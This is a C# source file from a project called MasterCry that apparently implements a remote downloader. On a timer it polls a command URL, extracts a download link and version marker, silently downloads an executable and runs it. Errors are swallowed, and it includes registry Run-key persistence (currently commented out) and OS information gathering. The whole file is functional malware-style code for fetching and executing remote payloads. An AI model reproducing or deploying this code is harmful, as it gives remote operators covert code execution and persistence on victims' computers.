
/****************************** ghost1372.github.io ******************************\
*	Module Name:	Form1.cs
*	Project:		MasterCry
*	Copyright (C) 2017 Mahdi Hosseini, All rights reserved.
*	This software may be modified and distributed under the terms of the MIT license.  See LICENSE file for details.
*
*	Written by Mahdi Hosseini <Mahdidvb72@gmail.com>,  2017, 9, 18, 08:45 ب.ظ
*	
***********************************************************************************/

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace MasterCry
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

#region "Downloader"
        //Todo: Test Downloder
        private void Downloader()
        {
            var result = (new WebClient()).DownloadString(BuildVars.Command_URL);

            String link = ExtractData(result,BuildVars.Command_URL_Symbol);
            String ver = ExtractData(result, BuildVars.Command_VER_Symbol);

            var preVer = System_Details.ReadSetting(BuildVars.Config_Command_Version);

            if (preVer.Equals("0") || ver != preVer && !link.Equals("null"))
            {
                   try
                    {
                        System_Details.AddUpdateAppSettings(BuildVars.Config_Command_Version, ver);
                        using (WebClient wc = new WebClient())
                        {
                            wc.DownloadFileCompleted += WebClientDownloadCompleted;
                            wc.DownloadFileAsync(new System.Uri(link),ver + 
                            BuildVars.Exe_Name);
                        }
                    }
                    catch (WebException) { }
                    catch (Exception) { }
            }
        }
        private void WebClientDownloadCompleted(object sender, AsyncCompletedEventArgs args)
        {
            System.Diagnostics.Process.Start(System_Details.ReadSetting(BuildVars.Config_Command_Version) + BuildVars.Exe_Name);
        }
        private string ExtractData(string Result, string Symbol)
        {
            int pFrom = Result.IndexOf(Symbol) + Symbol.Length;
            int pTo = Result.LastIndexOf(Symbol);
            return Result.Substring(pFrom, pTo - pFrom);
        }
        #endregion
        //Check Every 2 Min
        private void tmrURLCheck_Tick(object sender, EventArgs e)
        {
            Downloader();
        }

        #region "Startup"
        private void RegisterInStartup(bool isChecked)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
                    (BuildVars.Registry_Key, true);
            if (isChecked)
            {
                registryKey.SetValue(BuildVars.Registry_AppName, Application.ExecutablePath);
            }
            else
            {
                registryKey.DeleteValue(BuildVars.Registry_AppName);
            }
        }
        public static bool CheckRegistryExists()
        {
            RegistryKey root;
            root = Registry.CurrentUser.OpenSubKey(BuildVars.Registry_Key, false);

            return root.GetValue(BuildVars.Registry_AppName) != null;
        }

        #endregion

        //Todo: Enable StartUp
        private void Form1_Load(object sender, EventArgs e)
        {
            if (!System.IO.File.Exists(BuildVars.Save_Location))
                System_Details.getOperatingSystemInfo();

            //if (!CheckRegistryExists())
            //{
            //    RegisterInStartup(true);
            //}
        }
    }
}
